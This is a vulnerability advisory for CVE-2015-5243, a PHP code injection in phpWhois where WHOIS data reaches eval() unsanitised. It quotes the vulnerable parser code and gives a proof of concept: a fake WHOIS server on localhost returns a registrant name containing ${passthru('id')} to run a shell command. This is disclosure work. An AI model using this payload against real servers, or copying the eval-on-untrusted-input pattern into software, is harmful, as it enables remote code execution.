# phpWhois PHP Code Injection #

## Vulnerability Overview ##

phpWhois and some of its forks in versions before 5.1.0 are prone to a
code injection vulnerability due to insufficient sanitization of returned
WHOIS data. This allows attackers controlling the WHOIS information of a
requested domain to execute arbitrary PHP code in the context of the
application.

* **Identifier**            : SBA-ADV-20180425-01
* **Type of Vulnerability** : Code Injection
* **Software/Product Name** : phpWhois
* **Vendor**                : [phpwhois.org](http://www.phpwhois.org/),
                              [abcdmitry](https://github.com/phpWhois/phpWhois),
                              [jsmitty12](https://github.com/jsmitty12/phpWhois),
                              [webalternative](https://github.com/webalternative/phpWhois)
                              and others
* **Affected Versions**     : phpwhois.org: 4.2.2 and probably prior,
                              as well as the following forks
                              abcdmitry: 4.2.5 and probably prior,
                              jsmitty12: 5.0.2 and probably prior
* **Fixed in Version**      : jsmitty12: 5.1.0
* **CVE ID**                : CVE-2015-5243
* **CVSSv3 Vector**         : CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
* **CVSSv3 Base Score**     : 9.8 (Critical)

## Vendor Description ##

> This package contains a Whois (RFC954) library for PHP. It allows a
> PHP program to create a Whois object, and obtain the output of a
> whois query with the lookup function.

Source: <https://github.com/phpWhois/phpWhois>

## Impact ##

By exploiting the vulnerability documented in this advisory, an
attacker controlling the WHOIS information of a domain retrieved via
phpWhois can execute arbitrary PHP code in the context of the
application. The set of domains enabling this attack vector is limited
to certain top-level domains. Sensitive data accessible by the
application might get exposed through this attack.

The vulnerability is fixed in version 5.1.0 or newer of jsmitty12's fork.
We recommend upgrading to this version.

## Vulnerability Description ##

phpWhois implements multiple generic parsers for WHOIS data in
`whois.parser.php`. The parser implemented in function
`generic_parser_b` is vulnerable to injection of PHP code.

The function `generic_parser_b` builds a PHP statement from WHOIS data
values by concatenating strings without proper sanitization. It then
passes the statement to the `eval` function:

```php
function generic_parser_b($rawdata, $items = array(), $dateformat = 'mdy', $hasreg = true, $scanall = false) {
[...]
    foreach ($rawdata as $val) {
        if (trim($val) != '') {
            if (($val[0] == '%' || $val[0] == '#') && $disok) {
                $r['disclaimer'][] = trim(substr($val, 1));
                $disok = true;
                continue;
            }
            $disok = false;
            reset($items);
            foreach ($items as $match => $field) {
                $pos = strpos($val, $match);
                if ($pos !== false) {
                    if ($field != '') {
                        $var = '$r' . getvarname($field);
                        $itm = trim(substr($val, $pos + strlen($match)));
                        if ($itm != '')
                            eval($var . '="' . str_replace('"', '\"', $itm) . '";');
                    }
                    if (!$scanall)
                        break;
                }
            }
        }
[...]
}
```

At least the following 33 top-level domain handlers make use of the
vulnerable parser:

```text
ae, aero, ag, asia, au, bh, biz, cat, cn, co, co.za, fi, hu, in, info, jp, lu, me, mobi, museum, name, nz, org, pro, ru, sc, se, su, tel, travel, us, ws, xxx
```

## Proof-of-Concept ##

An attacker can exploit this vulnerability by setting malicious WHOIS
information such as `Registrant Name: ${passthru('id')}` for an arbitrary
`.org` domain.
Instead of a real name, we specify `${passthru('id')}` which PHP will
interpret as a variable expansion inside double quoted string literals.
We simulate this situation via a simple WHOIS server implementation:

```py
import SocketServer

DATA = "Registrant Name: ${passthru('id')}\n"

class WhoisHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        self.request.recv(1024)
        print('Request received')
        self.request.sendall(DATA)
        print('Payload sent')

if __name__ == '__main__':
    SocketServer.ThreadingTCPServer.allow_reuse_address = True
    server = SocketServer.ThreadingTCPServer(('127.0.0.1', 9999), WhoisHandler)
    server.serve_forever()
```

The following example sets up phpWhois to use the simulated WHOIS
server and requests information for `example.org`:

```php
<?php
require_once(__DIR__ . '/vendor/autoload.php');

$whois = new phpWhois\Whois;
$whois->useServer('org', '127.0.0.1:9999');
echo $whois->lookup('example.org');
```

Therefore, the vulnerable phpWhois version executes the injected PHP
statement `passthru('id')` which will execute the Unix `id` command on the
server and return its output.

## Timeline ##

* `2018-04-25`: identification of vulnerability
* `2018-04-26`: initial contact of several phpWhois and fork maintainers
* `2018-04-26`: disclosed vulnerability to phpwhois.org project maintainer
* `2018-04-27`: disclosed vulnerability to jsmitty12
* `2018-04-30`: phpwhois.org project maintainer stated that it is a
                known issue (CVE-2015-5243) with a fix committed at
                <https://github.com/sparc/phpWhois.org>
* `2018-04-30`: fix is not released yet and MITRE lists CVE-2015-5243
                as assigned but private
* `2018-05-29`: jsmitty12 released fixed version 5.1.0
* `2018-08-01`: public disclosure

## References ##

* Original advisory: <https://blog.nettitude.com/uk/cve-2015-5243-phpwhois-remote-code-execution>
* Fixes:
  * <https://github.com/sparc/phpWhois.org/commit/5cc572490c9053d46598ec9348a11e36a5a33a46#diff-f150ae17da7341bf6c2eff928684b3a3>
  * <https://github.com/Gemorroj/phpwhois/commit/91c937e03c876ba1290b6de2a3ad953d2105fdd0>
  * <https://github.com/jsmitty12/phpWhois/commit/863ccf62824f9998099ed20c2952ec8953ce3d06>

## Credits ##

* Original advisory by Iain Wallace ([Nettitude](https://www.nettitude.com/))
* Rediscovered by David Gnedt ([SBA Research](https://www.sba-research.org/))
